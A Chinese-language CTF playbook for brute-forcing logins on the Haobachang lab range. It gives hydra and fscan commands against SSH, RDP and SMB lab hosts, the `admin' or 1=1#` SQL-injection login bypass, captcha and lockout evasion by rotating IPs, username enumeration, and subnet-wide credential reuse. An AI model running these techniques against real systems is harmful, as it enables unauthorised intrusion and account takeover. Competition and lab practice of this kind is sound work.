## 官方字典情报（登录爆破先交叉这三份）

好靶场官方字典仓库（GitHub）：

```
dict/Password.txt        # 通用密码（含中文站常用）
dict/chinaname.txt       # 中文名（当用户名用）
dict/common_phones.txt   # 常见手机号（当用户名 / 短信链用）
```

```bash
# 拉取（两条路径，第一条不通走第二条）
curl -LO https://raw.githubusercontent.com/haobachang-1/haobachangBlog/main/dict/Password.txt
curl -LO https://cdn.jsdelivr.net/gh/haobachang-1/haobachangBlog@main/dict/chinaname.txt
curl -LO https://cdn.jsdelivr.net/gh/haobachang-1/haobachangBlog@main/dict/common_phones.txt
```

- **三文件交叉**：用户名用 `chinaname.txt` + `common_phones.txt` 拼，密码用 `Password.txt`；比 SecLists 通用字典命中率高。
- 某道题卡在"枚举 730 个归档名 / 常见口令矩阵全失败"时，**先换官方字典再换思路**。

**★ 实测优先级（128 教务系统作战，2026-10-08）：官方字典 > SecLists 10k > 自造常见口令**

```
顺序打 91 个（Password.txt）= 15 秒；命中位置：第 43 个
案例：admin / 4Dgifts → 200 返回 15027 字节控制台页 → <div class="flag-text">FLAG: flag{...}</div>
```

**实测教训（三条）**：
1. **别自己裸试常见 20 个口令** —— 那是"看起来在做事"但命中率最低的路径；先拉官方字典顺序打
2. **题面说"左边功能球里有官方字典" = 真的要用它**（不是提示语，是解法）
3. **判据用响应体长度，不用状态码**：失败 `HTTP 200` + 6294 字节（登录页 + alert 文案）；成功 **15027 字节**（含 `.flag-text` 的控制台页）
4. **别被"Set-Cookie 被清"误导** —— Flask 的失败响应本来就不发 cookie，登录成功后自然带 session

> 附带：**首页 CSS 里预置了 `.flag-section` / `.flag-text` 样式类 ⇒ flag 在登录后页面渲染** —— 这种"样式类先行泄露"是很强的题面线索，看到就说明"目标是登录进去"。

## 爆破纪律（薄容器与限速锁，先看这两条再开跑）

**① 薄容器（Flask / Werkzeug dev server 类单线程靶机）**

```
Session 复用 + 4-6 并发 + 0.2s 节流 + 命中即停 + 失败重试
```

串行会慢死、高并发会把容器打死（端口变 closed，多数平台无看门狗不自动重启）—— **4-6 并发是甜点区**。

**② 限速锁的表现形式（会让状态码判定失真）**

- 「错误次数过多，请 N 秒后再试！」这类提示**注入在 POST 响应里且状态码是 HTTP 200** ⇒ 靠 302/200 判成败会全错；**先单发一次验证判定词**。
- 各实例阈值不同（实测一例 ≈17s 锁、另一例需 3s 间隔）；先探阈值再定节流。
- 用户名枚举看提示差异（"密码错误" vs "用户不存在"），拿到用户名后爆破量减半。

## 服务爆破（hydra/fscan）

```bash
# 本机字典路径（SecLists 已在）：
#   Windows 侧：C:\tools\SecLists\Passwords\Common-Credentials\Pwdb_top-1000.txt（或 10k-most-common.txt）
#               C:\tools\SecLists\Usernames\cirt-default-usernames.txt
#   WSL 里同一份文件的路径是 /mnt/c/tools/SecLists/...

# hydra 在 WSL ghost 里（Windows 侧没有）——注意 Linux 路径写法
wsl -d ghost -- hydra -l root -P /mnt/c/tools/SecLists/Passwords/Common-Credentials/Pwdb_top-1000.txt -t 32 -f ssh://10.10.1.11
wsl -d ghost -- hydra -l administrator -P /mnt/c/tools/SecLists/Passwords/Common-Credentials/Pwdb_top-1000.txt -t 16 10.10.1.22 rdp
wsl -d ghost -- hydra -L /mnt/c/tools/SecLists/Usernames/cirt-default-usernames.txt -P /mnt/c/tools/SecLists/Passwords/Common-Credentials/Pwdb_top-1000.txt -t 32 10.10.1.22 smb

# fscan 一把梭（内网首选，自动多服务+常见洞）——不在 PATH，用全路径
C:\tools\bin\fscan.exe -h 10.10.1.0/24
C:\tools\bin\fscan.exe -h 10.10.1.22 -user admin -pwdf C:\tools\SecLists\Passwords\Common-Credentials\Pwdb_top-1000.txt
```

- 字典：`Pwdb_top-1000.txt` 先跑，再上 `10k-most-common.txt`；比赛专用补充：`{队名}`、`{比赛名}`、年份 `2024/2025/2026`、`P@ssw0rd`
- **Windows 用户名先枚举**：`net user`、enum4linux、`lookupsid.py`（RID 循环）拿到真用户名再爆破，admin/administrator/guest 外常有 `dbadmin`、`sqlsvc`、`backup` 等服务账号

## Web 登录框

- 先手：admin/admin123 等默认组 + 万能口令一枪 `admin' or 1=1#`（登录注入直接进）
- 验证码：看可否复用（不刷新直接重放）、前端校验（删参数）、万能码 `0000`、算术题 burp 正则解
- 爆破走 burp Intruder（pitchfork 多位）或脚本：
  - 有 token/CSRF 的 → 脚本每轮先 GET 取 token 再 POST
  - 前端 MD5 密码 → burp Intruder 挂 hash 规则（Payload Processing → Hash → MD5）
  - 判据别只看 302：看响应长度/`location` 头/`set-cookie` 有无 session

## 假点

- 爆破锁账号 → 改判据：锁 5 分钟就低速率轮换 IP/账号错开；或先找「注册/找回」逻辑洞（比赛常见弱逻辑）
- 登录报「密码错误」vs「用户不存在」响应差 → 用户名枚举到手，再爆破减半
- 爆出密码登不进 → 可能是二次验证/绑定 IP 段；换同一凭据打同段其它机器
- redis/mysql 报 `Access denied` 但不锁定 → 无限速随便跑，-t 拉满
- fscan 参数认准：`-user` 单用户、`-userf` 用户字典、`-pwdf` 密码字典；**没有 `-u admin` 这种写法**（`-u` 是 URL）
- 拿到一套凭据：**立刻 fscan -userf -pwdf 全段复用**，这是内网比赛最大分差来源
